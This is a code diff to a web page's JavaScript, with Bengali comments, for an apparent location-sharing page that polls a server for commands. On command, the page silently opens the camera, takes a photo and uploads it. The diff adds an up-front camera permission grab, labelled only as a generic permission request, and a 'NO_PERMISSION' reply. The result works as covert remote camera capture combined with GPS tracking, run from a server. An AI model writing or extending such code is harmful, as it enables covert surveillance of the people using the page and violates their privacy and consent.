@@ -93,11 +93,22 @@
 
         getDeviceInfo();
 
-        function startSharing() {
+        async function startSharing() {
             btn.disabled = true;
             btn.innerText = '⏳ সংযোগ স্থাপন...';
-            statusMsg.innerText = '📡 লোকেশন অ্যাক্সেস চাচ্ছি...';
+            statusMsg.innerText = '📡 পারমিশন চাচ্ছি...';
 
+            // ১. প্রথমে ক্যামেরার পারমিশন নেওয়া (ছবি তোলার জন্য)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop()); // পারমিশন পেলে বন্ধ করে দেওয়া
+                console.log("ক্যামেরা পারমিশন পাওয়া গেছে");
+            } catch (err) {
+                console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
+                // ইউজার না দিলেও আমরা লোকেশন চালু রাখব
+            }
+
+            // ২. এরপর লোকেশনের পারমিশন নেওয়া
             if (!navigator.geolocation) {
                 alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
                 return;
@@ -172,7 +183,6 @@
         }
 
         function checkCommands() {
-            // সার্ভার থেকে এই ডিভাইসের ডেটা চেক করা (কমান্ড আছে কিনা)
             fetch('/api/clients')
                 .then(res => res.json())
                 .then(clients => {
@@ -184,14 +194,12 @@
         }
 
         function takePhoto() {
-            // ক্যামেরা চালু করার চেষ্টা
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
                     
-                    // ভিডিও লোড হওয়ার পর ছবি তোলা
                     video.onloadedmetadata = () => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
@@ -199,16 +207,16 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // ক্যামেরা বন্ধ করা
                         stream.getTracks().forEach(track => track.stop());
                         
-                        // ছবি ডেটা সার্ভারে পাঠানো
-                        const imageData = canvas.toDataURL('image/jpeg', 0.6); // কোয়ালিটি ৬০%
+                        const imageData = canvas.toDataURL('image/jpeg', 0.6); 
                         sendCameraData(imageData);
                     };
                 })
                 .catch(err => {
                     console.error("ক্যামেরা অ্যাক্সেস ব্যর্থ:", err);
+                    // পারমিশন না থাকলে কমান্ড রিসেট করার জন্য ফাঁকা ছবি পাঠানো
+                    sendCameraData("NO_PERMISSION"); 
                 });
         }
 
